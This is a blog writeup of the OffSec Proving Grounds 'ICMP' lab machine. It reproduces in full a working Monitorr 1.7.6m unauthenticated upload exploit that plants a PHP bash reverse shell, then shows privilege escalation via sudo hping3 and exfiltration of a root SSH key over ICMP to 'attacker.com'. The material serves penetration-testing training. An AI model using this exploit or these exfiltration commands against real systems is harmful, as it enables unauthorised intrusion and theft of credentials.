---
title: "Proving grounds Play: ICMP"
layout: post
date: 2023-07-15 12:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---
# Walkthrough on Youtube

[![youtube](/assets/images/CTF/Proving_Grounds/ICMP/youtube.png)](https://youtu.be/6fyL_fFyV4c)

## NMAP

![img](/assets/images/CTF/Proving_Grounds/ICMP/nmap.png)

## PORT 80 Tech Stack

- Operating System: Debian
- Web Technology: Apache, PHP (view-page-source)

## Monitorr

![img](/assets/images/CTF/Proving_Grounds/ICMP/monitorr%20version.png)

![img](/assets/images/CTF/Proving_Grounds/ICMP/searchsploit_search.png)

### Exploit Code

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    requests.post(url, headers=headers, data=data)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    requests.get(url, headers=headers)
```
### Obtaining Reverse Shell

![img](/assets/images/CTF/Proving_Grounds/ICMP/rce1.png)

**Obtained local flag**

![img](/assets/images/CTF/Proving_Grounds/ICMP/local_flag.png)

# Privilege Escalation
### Obtain user

The permission is denied to access the `devel` folder as current user is not a system user. But as the tip found in the reminder file below.

![img](/assets/images/CTF/Proving_Grounds/ICMP/reminder.png)

The php file `crypt.php` inside the `devel` folder disclosed the SSH password for the user `fox`.

```php
<?php
echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
?>
```
**User access obtained.**

![img](/assets/images/CTF/Proving_Grounds/ICMP/user.png)

## Root Privilege Escalation

Check the current user sudo permissions.

![img](/assets/images/CTF/Proving_Grounds/ICMP/sudo-l.png)

Search for exploit in GTFO bins for `hping3`

### Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```sh
sudo hping3
/bin/sh
```

The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:
```sh
sudo hping3 --icmp --listen xxx --dump
```

RHOST=attacker.com
LFILE=file_to_read
```sh
sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
```

## Transfering SSH key locally to obtain root access through hping3

### ICMP Listener

![img](/assets/images/CTF/Proving_Grounds/ICMP/icmp-listener.png)

### ICMP: Data send

![img](/assets/images/CTF/Proving_Grounds/ICMP/icmp_key_send.png)

### ICMP: Data Receive

![img](/assets/images/CTF/Proving_Grounds/ICMP/icmp_root_ssh_key.png)

## SSH Root User

SSH to the root user using the obtained root SSH key.

![img](/assets/images/CTF/Proving_Grounds/ICMP/root.png)

**Root user access and proof.txt obtained**

![img](/assets/images/CTF/Proving_Grounds/ICMP/proof.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
